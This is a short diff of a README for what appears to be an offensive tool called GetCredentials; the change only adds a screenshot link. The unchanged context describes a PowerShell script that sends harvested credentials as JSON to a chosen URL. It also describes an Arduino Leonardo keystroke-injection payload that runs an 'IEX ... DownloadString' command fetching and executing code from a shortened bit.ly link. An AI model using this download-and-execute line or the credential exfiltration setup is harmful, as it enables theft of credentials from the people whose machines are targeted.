@@ -17,6 +17,8 @@ Performs the following task
     -url
         Enter url where the data will be sent as a json request
         Example: ./GetCredentials.ps1 -url http://192.168.1.174/data
+        
+![alt text](https://raw.githubusercontent.com/mattiasgrondahl/GetCredentials/master/output.PNG)
 
 Keyboard_payload.ino works for Arduino leonard with swedish keyboard
 Will run IEX (New-Object Net.WebClient).DownloadString("https://bit.ly/2El9Fyw")
